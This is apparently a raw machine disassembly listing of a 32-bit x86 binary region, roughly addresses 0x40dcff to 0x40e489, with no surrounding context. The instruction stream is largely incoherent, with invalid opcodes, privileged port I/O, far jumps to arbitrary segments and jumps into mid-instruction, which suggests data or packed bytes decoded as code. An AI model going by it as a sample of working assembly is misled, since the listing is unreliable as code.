  40dcff:	shl    DWORD PTR [eax+0x48e9e2e0],1
  40dd05:	dec    ebp
  40dd06:	test   eax,0xa9a7a37d
  40dd0b:	dec    eax
  40dd0c:	pop    DWORD PTR [ecx+0x1509d279]
  40dd12:	push   eax
  40dd13:	mov    dl,0xc5
  40dd15:	sub    esi,DWORD PTR [edi]
  40dd17:	dec    esp
  40dd18:	test   DWORD PTR [eax],edx
  40dd1a:	cwde   
  40dd1b:	cmc    
  40dd1c:	(bad)  
  40dd1d:	dec    ebp
  40dd1e:	jo     0x40dd41
  40dd20:	mov    ecx,0x18b7d1d
  40dd25:	jbe    0x40dd03
  40dd27:	mov    al,ds:0x8b0a6c39
  40dd2c:	mov    cl,0x7d
  40dd2e:	xchg   DWORD PTR [edx],esi
  40dd30:	lods   al,BYTE PTR ds:[esi]
  40dd31:	jns    0x40dd16
  40dd33:	inc    edi
  40dd34:	sub    bl,ah
  40dd36:	cmp    BYTE PTR [edx+0x2a],ch
  40dd39:	mov    esi,0xf329a18e
  40dd3e:	adc    ebx,DWORD PTR [edx]
  40dd40:	and    ebp,DWORD PTR [edi+0x32]
  40dd43:	xchg   BYTE PTR fs:[esi+esi*2-0x4],al
  40dd48:	jge    0x40dd3d
  40dd4a:	sbb    al,0x7a
  40dd4c:	scas   eax,DWORD PTR es:[edi]
  40dd4d:	(bad)  
  40dd4e:	je     0x40dcd5
  40dd50:	push   0xd970732f
  40dd55:	ss inc edi
  40dd57:	ret    0x1f22
  40dd5a:	mov    cl,0x9f
  40dd5c:	sahf   
  40dd5d:	xor    al,0x7a
  40dd5f:	push   ss
  40dd60:	cs clc 
  40dd62:	and    edx,edx
  40dd64:	outs   dx,BYTE PTR ds:[esi]
  40dd65:	aaa    
  40dd66:	ror    esi,0x6
  40dd69:	imul   edi,DWORD PTR fs:[ebp+0x4655dbc],0xffffffed
  40dd71:	mov    cl,0xdf
  40dd73:	add    DWORD PTR [esp+ebx*8-0x35],esp
  40dd77:	dec    ebp
  40dd78:	ret    
  40dd79:	mov    DWORD PTR [edx+edx*4+0x509bcbd9],esp
  40dd80:	js     0x40dd12
  40dd82:	mov    edi,0x60bd1b3a
  40dd87:	daa    
  40dd88:	(bad)
  40dd8c:	sub    ebx,DWORD PTR [edx]
  40dd8e:	sub    cl,bh
  40dd90:	fisttp QWORD PTR [ebx+0x6021159]
  40dd96:	mov    eax,ds:0xe138ff73
  40dd9b:	mov    ds:0xd9235eb0,al
  40dda0:	adc    al,0x73
  40dda2:	cli    
  40dda3:	das    
  40dda4:	lods   eax,DWORD PTR ds:[esi]
  40dda5:	scas   eax,DWORD PTR es:[edi]
  40dda6:	jmp    0x9d99:0x4f6ee5ff
  40ddad:	lods   eax,DWORD PTR ds:[esi]
  40ddae:	dec    esp
  40ddaf:	ret    0xea73
  40ddb2:	sub    ebx,DWORD PTR [ebp+edx*8+0x5d]
  40ddb6:	jmp    0x40ddb3
  40ddb8:	hlt    
  40ddb9:	add    BYTE PTR [esi+0x3e],al
  40ddbc:	jno    0x40ddd4
  40ddbe:	sub    bl,BYTE PTR [edi-0x1721f190]
  40ddc4:	xchg   esi,eax
  40ddc5:	and    BYTE PTR [eax*2-0x66469d7a],bl
  40ddcc:	hlt    
  40ddcd:	js     0x40de3f
  40ddcf:	dec    ebp
  40ddd0:	push   cs
  40ddd1:	inc    eax
  40ddd2:	mov    al,ds:0x8f1fd4f3
  40ddd7:	dec    ecx
  40ddd8:	ror    ecx,1
  40ddda:	loop   0x40dd5f
  40dddc:	mov    al,cs:0x30a6b08c
  40dde2:	cs cli 
  40dde4:	adc    eax,0x4c11786f
  40dde9:	stc    
  40ddea:	xor    dh,dh
  40ddec:	pop    eax
  40dded:	lds    edi,FWORD PTR [esp+ecx*4+0x519183a7]
  40ddf4:	xor    esi,DWORD PTR [eax-0xf]
  40ddf7:	es push esp
  40ddf9:	je     0x40de19
  40ddfb:	xchg   ebp,eax
  40ddfc:	or     al,0xd1
  40ddfe:	xor    BYTE PTR [eax+0x1a],0xd9
  40de02:	dec    esp
  40de03:	adc    eax,0xb38318bd
  40de08:	add    eax,0x4d49e9a6
  40de0d:	xlat   BYTE PTR ds:[ebx]
  40de0e:	and    al,0xae
  40de10:	dec    edx
  40de11:	rcl    DWORD PTR [eax],cl
  40de13:	lock sub edi,DWORD PTR [edx+0x48261845]
  40de1a:	aaa    
  40de1b:	or     bl,dl
  40de1d:	test   al,0x4
  40de1f:	mov    DWORD PTR [ebp-0x18677962],edx
  40de25:	shl    BYTE PTR [ebp+0x72],0xdb
  40de29:	mov    esp,0x70878fe3
  40de2e:	or     al,0xf2
  40de30:	ror    DWORD PTR [esi+ecx*8],cl
  40de33:	sbb    dl,BYTE PTR [ecx+0x58c26166]
  40de39:	add    DWORD PTR [eax-0x61f7bd11],edi
  40de3f:	daa    
  40de40:	mov    ds:0x7fc70abb,eax
  40de45:	rcr    BYTE PTR [ecx+0x40b339e0],0xa1
  40de4c:	inc    esp
  40de4d:	jecxz  0x40decb
  40de4f:	(bad)  
  40de50:	lock mov ebp,fs
  40de53:	jbe    0x40de0b
  40de55:	aas    
  40de56:	pop    ds
  40de57:	inc    ebp
  40de58:	mov    eax,0x461e4138
  40de5d:	fwait
  40de5e:	mov    BYTE PTR [edx],cl
  40de60:	mov    al,0x1d
  40de62:	ror    DWORD PTR [edi+ebx*4],cl
  40de65:	xchg   al,bl
  40de67:	mov    esp,ebx
  40de69:	aam    0xcb
  40de6b:	mov    esp,0x3896bbe0
  40de70:	mov    gs,ecx
  40de72:	ret    0xc790
  40de75:	xchg   ecx,eax
  40de76:	sti    
  40de77:	mul    DWORD PTR [esi]
  40de79:	stos   DWORD PTR es:[edi],eax
  40de7a:	mov    al,ds:0xcffa3983
  40de7f:	jmp    0x98ee038
  40de84:	test   DWORD PTR [eax],ecx
  40de86:	inc    edi
  40de87:	xor    DWORD PTR [edi+0x7571915e],edi
  40de8d:	jmp    0x40de6a
  40de8f:	cmp    BYTE PTR [edi-0x32],bl
  40de92:	jle    0x40deef
  40de94:	jno    0x40de57
  40de96:	fdecstp 
  40de98:	push   eax
  40de99:	call   0x67a3:0x413a6d45
  40dea0:	es pop esp
  40dea2:	push   ebx
  40dea3:	xchg   ebx,eax
  40dea4:	and    eax,0x5d0212ae
  40dea9:	ret    
  40deaa:	ins    DWORD PTR es:[edi],dx
  40deab:	add    eax,0xa5d2048a
  40deb0:	pop    ecx
  40deb1:	adc    bh,BYTE PTR [edx+0x7ef01f69]
  40deb7:	push   ebp
  40deb8:	mov    eax,0x55a80a76
  40debd:	pop    ebx
  40debe:	jmp    0xc0a0:0xa3d1
  40dec4:	mov    eax,ds:0x409ce68f
  40dec9:	mov    BYTE PTR [edx-0x468871d1],ah
  40decf:	add    al,0xdf
  40ded1:	mov    bh,0x2
  40ded3:	imul   esi,ebx,0xfffffff5
  40ded6:	in     al,dx
  40ded7:	xchg   ecx,eax
  40ded8:	outs   dx,BYTE PTR ds:[esi]
  40ded9:	pop    ds
  40deda:	jns    0x40de8e
  40dedc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dedd:	(bad)  
  40dede:	xor    al,0x7d
  40dee0:	xlat   BYTE PTR ds:[ebx]
  40dee1:	xlat   BYTE PTR ds:[ebx]
  40dee2:	(bad)  
  40dee3:	out    0xb2,al
  40dee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dee6:	or     al,0x3a
  40dee8:	and    ecx,DWORD PTR [edx]
  40deea:	repnz fmul DWORD PTR [ecx]
  40deed:	dec    edi
  40deee:	and    dh,al
  40def0:	pop    edx
  40def1:	mov    bl,0x80
  40def3:	std    
  40def4:	shl    esi,0x40
  40def7:	and    ecx,eax
  40def9:	repnz pop esi
  40defb:	pop    ebx
  40defc:	xor    BYTE PTR [edx-0x33bad028],bh
  40df02:	jge    0x40dee9
  40df04:	loope  0x40deb3
  40df06:	add    DWORD PTR [eax-0x12dd843c],ebx
  40df0c:	adc    DWORD PTR [ecx],0xffffff94
  40df0f:	enter  0xc276,0xc1
  40df13:	scas   eax,DWORD PTR es:[edi]
  40df14:	adc    DWORD PTR [eax-0x32f323b2],ebx
  40df1a:	xlat   BYTE PTR ds:[ebx]
  40df1b:	xchg   esp,eax
  40df1c:	test   al,0x2e
  40df1e:	inc    esp
  40df1f:	fmul   DWORD PTR [ebp-0x10]
  40df22:	stos   BYTE PTR es:[edi],al
  40df23:	mov    ds:0x2c06af48,al
  40df28:	push   ebp
  40df29:	(bad)  
  40df2a:	push   cs
  40df2b:	inc    edi
  40df2c:	cmp    eax,0x341f7f0
  40df31:	sub    BYTE PTR [esi],dh
  40df33:	clc    
  40df34:	hlt    
  40df35:	jbe    0x40df1a
  40df37:	and    eax,0x3bf756f5
  40df3c:	(bad)
  40df3f:	jns    0x40df42
  40df41:	xchg   esp,eax
  40df42:	xchg   DWORD PTR [edi-0x7e],edx
  40df45:	fiadd  WORD PTR [ebx+0x52502031]
  40df4b:	and    eax,0x9172c9d2
  40df50:	xor    dl,al
  40df52:	jnp    0x40df85
  40df54:	mov    BYTE PTR [edx+0x70a5a53e],ah
  40df5a:	mov    edx,0xc2c970a3
  40df5f:	inc    ecx
  40df60:	je     0x40df68
  40df62:	sub    al,0x5f
  40df64:	mov    BYTE PTR [eax-0x6f286273],al
  40df6a:	scas   al,BYTE PTR es:[edi]
  40df6b:	push   eax
  40df6c:	add    esp,edx
  40df6e:	mov    ebx,0x57d1e936
  40df73:	or     eax,0xfe5daf16
  40df78:	scas   eax,DWORD PTR es:[edi]
  40df79:	test   al,0x4b
  40df7b:	pop    esp
  40df7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df7d:	out    0xea,eax
  40df7f:	xor    eax,0xd8e5d58b
  40df84:	push   edi
  40df85:	repz and al,0xbd
  40df88:	xchg   ecx,eax
  40df89:	les    ecx,FWORD PTR [ebx+0x54efa14d]
  40df8f:	mov    ds:0x755b374c,al
  40df94:	pop    esp
  40df95:	fcom   QWORD PTR [esi+0x49]
  40df98:	or     BYTE PTR [edi],ch
  40df9a:	mov    eax,0x8bafe3a7
  40df9f:	xchg   edi,eax
  40dfa0:	sbb    BYTE PTR [edi+0x60],al
  40dfa3:	push   edi
  40dfa4:	pop    esp
  40dfa5:	pushf  
  40dfa6:	inc    edx
  40dfa7:	or     eax,0x4dab8bdc
  40dfac:	dec    ecx
  40dfad:	neg    BYTE PTR ds:0x5eedd477
  40dfb3:	fs jecxz 0x40df73
  40dfb6:	pop    edx
  40dfb7:	adc    edi,DWORD PTR [eax]
  40dfb9:	mov    ah,0x93
  40dfbb:	mov    bl,0xa8
  40dfbd:	ins    DWORD PTR es:[edi],dx
  40dfbe:	push   ebp
  40dfbf:	dec    edx
  40dfc0:	xchg   ebx,eax
  40dfc1:	jge    0x40df9f
  40dfc3:	stos   DWORD PTR es:[edi],eax
  40dfc4:	dec    eax
  40dfc5:	das    
  40dfc6:	leave  
  40dfc7:	mov    ebp,DWORD PTR [ecx-0x54]
  40dfca:	dec    eax
  40dfcb:	call   0xf449:0x1daf32dd
  40dfd2:	xor    esp,ecx
  40dfd4:	arpl   WORD PTR [edx+0x735f01b3],si
  40dfda:	leave  
  40dfdb:	sbb    dh,dh
  40dfdd:	das    
  40dfde:	dec    eax
  40dfdf:	cmp    ah,BYTE PTR [ecx+0x48]
  40dfe2:	mov    al,ds:0xe93dcbaa
  40dfe7:	push   0x5ae165af
  40dfec:	out    dx,eax
  40dfed:	pusha  
  40dfee:	nop
  40dfef:	repz pop edi
  40dff1:	xchg   edx,eax
  40dff2:	mov    al,0xc3
  40dff4:	dec    esi
  40dff5:	in     eax,0x68
  40dff7:	add    esi,ebp
  40dff9:	or     ah,BYTE PTR [ecx-0x35]
  40dffc:	dec    edi
  40dffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dffe:	add    ch,BYTE PTR [eax-0x6b]
  40e001:	shl    BYTE PTR [eax+ecx*2+0x1b5cdea7],1
  40e008:	push   esp
  40e009:	dec    ebp
  40e00a:	jo     0x40e051
  40e00c:	mov    ?,WORD PTR [edi]
  40e00e:	je     0x40e063
  40e010:	push   eax
  40e011:	je     0x40dfd5
  40e013:	je     0x40dfed
  40e015:	dec    esp
  40e016:	retf   0x828
  40e019:	retf   
  40e01a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e01b:	push   ebx
  40e01c:	push   0x5a7fc65a
  40e021:	gs push 0xaf9ecbab
  40e027:	add    al,0xc5
  40e029:	or     al,0x32
  40e02b:	jb     0x40e038
  40e02d:	out    0xa7,al
  40e02f:	push   ss
  40e030:	sub    esi,DWORD PTR [ebx+0x46d34bb3]
  40e036:	jle    0x40e06a
  40e038:	aaa    
  40e039:	jg     0x40e0b3
  40e03b:	jge    0x40e004
  40e03d:	aad    0xf8
  40e03f:	retf   
  40e040:	(bad)  
  40e042:	bound  dx,DWORD PTR [eax]
  40e045:	(bad)  
  40e046:	adc    BYTE PTR [ecx-0x2b154bed],dl
  40e04c:	sti    
  40e04d:	push   ebx
  40e04e:	push   0x9b879b6c
  40e053:	nop
  40e054:	sub    cl,bh
  40e056:	and    ch,al
  40e058:	pop    ds
  40e059:	and    dl,BYTE PTR [ebp+0x1a152ef1]
  40e05f:	sub    eax,DWORD PTR [esi]
  40e061:	sbb    edi,ebp
  40e063:	and    bl,BYTE PTR [ecx+esi*1+0x74fd8150]
  40e06a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e06b:	cli    
  40e06c:	mov    esi,0x9ae602d0
  40e071:	add    ebp,DWORD PTR [ecx+edx*2]
  40e074:	cmp    dl,0xe6
  40e077:	retf   
  40e078:	lods   al,BYTE PTR ds:[esi]
  40e079:	cwde   
  40e07a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e07b:	ins    BYTE PTR es:[edi],dx
  40e07c:	jl     0x40e076
  40e07e:	test   BYTE PTR [ecx+0x5f],0x85
  40e082:	jge    0x40e0d9
  40e084:	mov    ch,0x75
  40e086:	pop    edi
  40e087:	mov    ecx,0x2cd53d7f
  40e08c:	jmp    0x40e0ce
  40e08e:	repz xor dh,ah
  40e091:	lods   al,BYTE PTR ds:[esi]
  40e092:	add    al,0xe4
  40e094:	aaa    
  40e095:	cli    
  40e096:	xchg   edx,eax
  40e097:	jg     0x40e08f
  40e099:	and    eax,0x57dd9277
  40e09e:	je     0x40e036
  40e0a0:	xchg   edi,eax
  40e0a1:	jne    0x40e07e
  40e0a3:	xor    eax,0x1a205958
  40e0a8:	jmp    0xddd8:0xdda39f39
  40e0af:	js     0x40e0d3
  40e0b1:	adc    BYTE PTR [ebp-0x70a444bc],ah
  40e0b7:	sbb    edi,DWORD PTR [ebp+0x68]
  40e0ba:	pop    eax
  40e0bb:	push   esp
  40e0bc:	stc    
  40e0bd:	push   cs
  40e0be:	jns    0x40e054
  40e0c0:	lds    ecx,FWORD PTR [esi+0x2daf0a58]
  40e0c6:	dec    ecx
  40e0c7:	sahf   
  40e0c8:	mov    eax,0xb35b3500
  40e0cd:	scas   al,BYTE PTR es:[edi]
  40e0ce:	bound  esp,QWORD PTR [eax-0x5e164e43]
  40e0d4:	mov    esi,0x4271f72a
  40e0d9:	jl     0x40e07c
  40e0db:	mov    eax,ds:0xfa0b55
  40e0e0:	gs jecxz 0x40e11c
  40e0e3:	mov    esi,0x87daa6a6
  40e0e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0e9:	and    ch,ch
  40e0eb:	cdq    
  40e0ec:	adc    ebx,edi
  40e0ee:	scas   al,BYTE PTR es:[edi]
  40e0ef:	cli    
  40e0f0:	push   ecx
  40e0f1:	push   ss
  40e0f2:	and    eax,0xb3bb8222
  40e0f7:	mov    ds:0xc2d1b873,eax
  40e0fc:	stos   BYTE PTR es:[edi],al
  40e0fd:	repnz into 
  40e0ff:	dec    eax
  40e100:	jle    0x40e138
  40e102:	(bad)  
  40e103:	sbb    eax,0xcbafb5be
  40e108:	cli    
  40e109:	mov    BYTE PTR [ecx+0x7b],bh
  40e10c:	sub    DWORD PTR [edi-0x5a],0xffffffe9
  40e110:	add    DWORD PTR [eax],ebp
  40e112:	jo     0x40e0b0
  40e114:	mov    cl,0xb7
  40e116:	imul   bh
  40e118:	pusha  
  40e119:	add    eax,0x31c91886
  40e11f:	(bad)  
  40e120:	adc    esp,esi
  40e122:	loope  0x40e108
  40e124:	xchg   ecx,eax
  40e125:	and    ebp,edx
  40e127:	pop    es
  40e128:	and    eax,0xcf26a034
  40e12d:	push   edx
  40e12e:	mov    ds:0xd3a51579,al
  40e133:	sbb    al,0xac
  40e135:	sbb    al,0xc9
  40e137:	test   ecx,edi
  40e139:	call   0x9960:0xe598251
  40e140:	sub    ah,BYTE PTR [eax-0x22e0dd34]
  40e146:	jbe    0x40e1c6
  40e148:	imul   DWORD PTR [esi+0x352198b8]
  40e14e:	scas   eax,DWORD PTR es:[edi]
  40e14f:	pushf  
  40e150:	sbb    al,BYTE PTR [ebx-0x59]
  40e153:	dec    esi
  40e154:	nop
  40e155:	mov    cl,0x9f
  40e157:	mov    ds:0xa13e4ae2,eax
  40e15c:	jbe    0x40e1a0
  40e15e:	test   eax,0xc3bfda2
  40e163:	imul   BYTE PTR [ebp+0x3e]
  40e166:	pop    ss
  40e167:	test   al,0xad
  40e169:	lock ins DWORD PTR es:[edi],dx
  40e16b:	xor    eax,0x4126891b
  40e170:	lds    eax,FWORD PTR [ebx]
  40e172:	pop    esi
  40e173:	adc    edi,DWORD PTR ds:0x73dc85f4
  40e179:	jp     0x40e1a3
  40e17b:	or     ebx,DWORD PTR cs:[edi-0x5ba4cdec]
  40e182:	(bad)  [eax+0x7c2fa6f2]
  40e188:	mov    dl,0x15
  40e18a:	mov    al,ds:0x83720bf5
  40e18f:	addr16 ja 0x40e1f0
  40e192:	lods   eax,DWORD PTR ds:[esi]
  40e193:	lea    edx,[esi+esi*2+0x29585289]
  40e19a:	jl     0x40e189
  40e19c:	adc    bl,dl
  40e19e:	or     al,0x88
  40e1a0:	pop    edx
  40e1a1:	retf   0xee88
  40e1a4:	cmp    al,0xcf
  40e1a6:	shl    ebp,1
  40e1a8:	sbb    DWORD PTR [ecx-0x66],edx
  40e1ab:	jne    0x40e196
  40e1ad:	pop    edi
  40e1ae:	dec    ecx
  40e1af:	mov    ah,BYTE PTR [ecx+0x150dde12]
  40e1b5:	int3   
  40e1b6:	pusha  
  40e1b7:	push   0x9fcb2c8f
  40e1bc:	adc    al,0x2e
  40e1be:	mov    ch,0xbe
  40e1c0:	lock inc ebp
  40e1c2:	jecxz  0x40e221
  40e1c4:	(bad)  
  40e1c5:	ja     0x40e196
  40e1c7:	cmp    al,BYTE PTR [esi]
  40e1c9:	lods   al,BYTE PTR ss:[esi]
  40e1cb:	jg     0x40e1a9
  40e1cd:	mov    dh,0x77
  40e1cf:	push   0x19982c8a
  40e1d4:	mov    BYTE PTR [ebx-0x65],bh
  40e1d7:	shl    BYTE PTR [esi+0x6a],1
  40e1da:	mov    DWORD PTR [edi],edx
  40e1dc:	cmp    dh,BYTE PTR [ecx+0x4273b6bf]
  40e1e2:	test   al,0x1d
  40e1e4:	sub    al,0xed
  40e1e6:	call   FWORD PTR [eax+eax*2+0x75]
  40e1ea:	sbb    edx,DWORD PTR [ebp-0x42]
  40e1ed:	ins    BYTE PTR es:[edi],dx
  40e1ee:	push   edi
  40e1ef:	jge    0x40e1b8
  40e1f1:	add    ebp,0x8e5a1279
  40e1f7:	pushf  
  40e1f8:	outs   dx,DWORD PTR ds:[esi]
  40e1f9:	jnp    0x40e196
  40e1fb:	ins    DWORD PTR es:[edi],dx
  40e1fc:	xchg   esp,ecx
  40e1fe:	stc    
  40e1ff:	stos   BYTE PTR es:[edi],al
  40e200:	test   DWORD PTR [ecx-0x62],esi
  40e203:	inc    edi
  40e204:	jmp    0x40e208
  40e206:	je     0x40e1bd
  40e208:	xor    ecx,0x39
  40e20b:	ins    DWORD PTR es:[edi],dx
  40e20c:	call   0x33ca:0xcf6b8d67
  40e213:	push   es
  40e214:	rol    DWORD PTR [ebx],0xec
  40e217:	mov    bh,0x42
  40e219:	xor    eax,0xae402481
  40e21e:	or     esi,DWORD PTR [eax+0x39]
  40e221:	sbb    ah,BYTE PTR [ebx-0x75990e53]
  40e227:	mov    ds:0x95747d4f,al
  40e22c:	pop    esi
  40e22d:	dec    esp
  40e22e:	pop    ss
  40e22f:	jo     0x40e27c
  40e231:	adc    DWORD PTR ds:[edx],ecx
  40e234:	or     al,0x8f
  40e236:	inc    esp
  40e237:	xchg   esi,eax
  40e238:	xchg   ecx,eax
  40e239:	jb     0x40e229
  40e23b:	das    
  40e23c:	pusha  
  40e23d:	dec    esp
  40e23e:	pop    ebp
  40e23f:	mov    ch,0x1c
  40e241:	adc    al,0x61
  40e243:	mov    ecx,0xc983c0bf
  40e248:	std    
  40e249:	test   eax,0x899f383e
  40e24e:	shr    BYTE PTR [edi],cl
  40e250:	and    dh,BYTE PTR [ecx]
  40e252:	and    BYTE PTR [eax],al
  40e254:	xchg   ecx,eax
  40e255:	add    al,0xc4
  40e257:	call   0x3bbb7cbd
  40e25c:	fisubr WORD PTR [edi-0x21]
  40e25f:	inc    ecx
  40e260:	sti    
  40e261:	aam    0x87
  40e263:	add    ebp,DWORD PTR [edi+0x224a0357]
  40e269:	and    BYTE PTR [edi+0x40],0xaa
  40e26d:	and    ebp,edi
  40e26f:	(bad)  
  40e270:	fisttp DWORD PTR [edi]
  40e272:	mov    ch,0x8f
  40e274:	mov    ah,0xfe
  40e276:	sub    eax,0xb07e42ce
  40e27b:	xchg   ecx,eax
  40e27c:	mov    ds:0x13d3df15,eax
  40e281:	les    eax,FWORD PTR [edi+0x391a0af2]
  40e287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e288:	ja     0x40e26b
  40e28a:	mov    bh,BYTE PTR [edx-0x45]
  40e28d:	ret    0xafbb
  40e290:	jp     0x40e25f
  40e292:	dec    ebx
  40e293:	mov    ecx,0xf22286b3
  40e298:	dec    eax
  40e299:	inc    esp
  40e29a:	xchg   ecx,eax
  40e29b:	lea    eax,[esi+0x60e5bb22]
  40e2a1:	mov    edx,0x48d9b881
  40e2a6:	cli    
  40e2a7:	out    dx,eax
  40e2a8:	sub    al,0x8c
  40e2aa:	jo     0x40e262
  40e2ac:	imul   edi,ebx,0x1dea8332
  40e2b2:	outs   dx,BYTE PTR ds:[esi]
  40e2b3:	rcr    BYTE PTR [esi],cl
  40e2b5:	gs mov esp,0xb4680c3c
  40e2bb:	adc    al,0x6b
  40e2bd:	inc    esp
  40e2be:	sub    ah,cl
  40e2c0:	push   ebp
  40e2c1:	addr16 push esi
  40e2c3:	xchg   ecx,eax
  40e2c4:	(bad)  
  40e2c5:	sahf   
  40e2c6:	out    dx,al
  40e2c7:	mov    ebp,0x11b629aa
  40e2cc:	dec    DWORD PTR [ebp+0x43]
  40e2cf:	sbb    edx,0x30731cc3
  40e2d5:	xor    ebp,DWORD PTR [esi+eiz*4+0x27ce8edb]
  40e2dc:	mov    ds:0x168d0c1a,eax
  40e2e1:	into   
  40e2e2:	fiadd  WORD PTR ds:0xce2c1d4a
  40e2e8:	add    eax,0x83a87346
  40e2ed:	push   ebp
  40e2ee:	add    dh,BYTE PTR [ecx-0x1c]
  40e2f1:	lds    esi,FWORD PTR [edi]
  40e2f3:	sbb    al,0xa
  40e2f5:	(bad)  
  40e2f7:	aas    
  40e2f8:	sbb    bl,BYTE PTR [esi-0x79]
  40e2fb:	xor    eax,0xc64e59e4
  40e300:	jbe    0x40e322
  40e302:	dec    eax
  40e303:	mov    ebx,0x49dba106
  40e308:	mov    edx,0xd8e10c12
  40e30d:	enter  0xc2ec,0x3c
  40e311:	push   ebp
  40e312:	pop    ss
  40e313:	push   edi
  40e314:	mov    ecx,0x5cd51d45
  40e319:	and    bl,bh
  40e31b:	stos   DWORD PTR es:[edi],eax
  40e31c:	or     eax,0xe76d16a0
  40e321:	inc    edi
  40e322:	loop   0x40e2cb
  40e324:	jo     0x40e2b5
  40e326:	push   ds
  40e327:	dec    ecx
  40e328:	(bad)  
  40e329:	outs   dx,DWORD PTR ds:[esi]
  40e32a:	arpl   WORD PTR [edx-0x27],dx
  40e32d:	mov    edi,0x4a0506f7
  40e332:	jge    0x40e30a
  40e334:	sar    BYTE PTR [eax+ecx*8+0x5ff7c364],0x72
  40e33c:	and    al,0x67
  40e33e:	cld    
  40e33f:	adc    dh,BYTE PTR [ebx+0x44]
  40e342:	stos   BYTE PTR es:[edi],al
  40e343:	ins    BYTE PTR es:[edi],dx
  40e344:	scas   al,BYTE PTR es:[edi]
  40e345:	dec    edi
  40e346:	and    BYTE PTR [ebx],al
  40e348:	sub    al,0xc6
  40e34a:	cmp    BYTE PTR [esi+0x3a],dl
  40e34d:	jo     0x40e347
  40e34f:	sub    DWORD PTR [ecx],esp
  40e351:	push   ss
  40e352:	mov    bh,0x90
  40e354:	jnp    0x40e393
  40e356:	sub    BYTE PTR [edx+0x451f7e17],0x18
  40e35d:	adc    bl,BYTE PTR [ecx-0x184348a6]
  40e363:	ins    BYTE PTR es:[edi],dx
  40e364:	jl     0x40e38a
  40e366:	test   DWORD PTR [ebp-0x743f716a],ebp
  40e36c:	add    al,0x86
  40e36e:	mov    ecx,eax
  40e370:	fcomp  QWORD PTR [edx]
  40e372:	dec    edi
  40e373:	cdq    
  40e374:	xchg   esi,eax
  40e375:	pop    ds
  40e376:	add    DWORD PTR ds:0x5dd41a7a,ecx
  40e37c:	mov    eax,ds:0x3363ce58
  40e381:	or     bh,BYTE PTR [eax-0x80]
  40e384:	adc    al,0xa5
  40e386:	(bad)  
  40e388:	pop    ss
  40e389:	xchg   esi,eax
  40e38a:	cmp    BYTE PTR [ebx],ch
  40e38c:	mov    dh,0xb
  40e38e:	icebp  
  40e38f:	jl     0x40e3aa
  40e391:	call   0xebb3:0xd55c687
  40e398:	test   eax,0x8652916d
  40e39d:	pusha  
  40e39e:	ins    BYTE PTR es:[edi],dx
  40e39f:	and    edx,edi
  40e3a1:	pop    edi
  40e3a2:	psubsw mm3,QWORD PTR [eax+0x61f39414]
  40e3a9:	cmp    BYTE PTR [ebx-0x40],ah
  40e3ac:	dec    eax
  40e3ad:	aas    
  40e3ae:	test   BYTE PTR [edi+0x58],ch
  40e3b1:	mov    ah,0x98
  40e3b3:	pusha  
  40e3b4:	enter  0xf44c,0x62
  40e3b8:	mov    ds:0x1cdf0b9e,eax
  40e3bd:	adc    ch,BYTE PTR [edx+0x14645b56]
  40e3c3:	cmp    BYTE PTR [ecx-0x64],ch
  40e3c6:	or     eax,0xe0c94f84
  40e3cb:	ss aaa 
  40e3cd:	fs sti 
  40e3cf:	inc    edx
  40e3d0:	cs pop edi
  40e3d2:	dec    ebx
  40e3d3:	jae    0x40e395
  40e3d5:	popa   
  40e3d6:	xchg   ecx,eax
  40e3d7:	fisttp QWORD PTR [edi*8-0x30471db0]
  40e3de:	in     al,0xfd
  40e3e0:	mov    ecx,0xf884710c
  40e3e5:	loope  0x40e39a
  40e3e7:	pop    ds
  40e3e8:	and    edx,eax
  40e3ea:	(bad)  
  40e3eb:	adc    bl,BYTE PTR [eax+0x30743791]
  40e3f1:	or     ecx,DWORD PTR [ebp-0xd]
  40e3f4:	and    DWORD PTR [edi+edx*2],ebp
  40e3f7:	cmp    ebp,ebx
  40e3f9:	cdq    
  40e3fa:	cdq    
  40e3fb:	fs mov ecx,0x65aaec17
  40e401:	jle    0x40e409
  40e403:	in     al,dx
  40e404:	mov    cl,0x77
  40e406:	mov    al,ds:0x19b8cfd
  40e40b:	inc    edi
  40e40c:	pop    es
  40e40d:	sbb    ah,al
  40e40f:	adc    DWORD PTR [ecx+0x43ce649e],0xffffffe7
  40e416:	call   0xf764:0x7a9d179a
  40e41d:	dec    ebx
  40e41e:	and    eax,DWORD PTR [eax+0x70]
  40e421:	ja     0x40e45c
  40e423:	mov    eax,ds:0x2178e0f6
  40e428:	aaa    
  40e429:	loop   0x40e493
  40e42b:	push   edi
  40e42c:	xor    eax,0x60fae56a
  40e431:	shr    DWORD PTR [esi+0x21],cl
  40e434:	or     al,0x1e
  40e436:	mov    DWORD PTR [edi],edi
  40e438:	mov    ah,0x9a
  40e43a:	repnz sub edi,DWORD PTR [ecx-0x70]
  40e43e:	and    dl,ch
  40e440:	pop    eax
  40e441:	adc    esi,DWORD PTR [eax]
  40e443:	fs jo  0x40e486
  40e446:	retf   0x7d80
  40e449:	pop    ecx
  40e44a:	jne    0x40e48b
  40e44c:	mov    bl,0xee
  40e44e:	inc    esi
  40e44f:	imul   ebp,DWORD PTR [edi+0x36],0x4a
  40e453:	jmp    0xeaa437ae
  40e458:	jmp    0x40e49b
  40e45a:	inc    esp
  40e45b:	dec    ebp
  40e45c:	inc    ecx
  40e45d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e45e:	sbb    eax,0xa3d8c90f
  40e463:	ss cdq 
  40e465:	xchg   ebx,eax
  40e466:	xor    al,ah
  40e468:	bound  edx,QWORD PTR [ecx+edi*1]
  40e46b:	mov    ah,0x76
  40e46d:	lods   al,BYTE PTR ds:[esi]
  40e46e:	sbb    al,0x99
  40e470:	inc    esp
  40e471:	repz mov cl,0xb2
  40e474:	mov    ah,0x71
  40e476:	jecxz  0x40e493
  40e478:	pop    edx
  40e479:	out    0x1d,eax
  40e47b:	and    ebx,DWORD PTR [esi]
  40e47d:	cmp    BYTE PTR [esi-0x3cf6c4c8],dh
  40e483:	dec    edx
  40e484:	mov    al,0xc1
  40e486:	sub    DWORD PTR [edi+0x23],ebp
  40e489:	aaa    
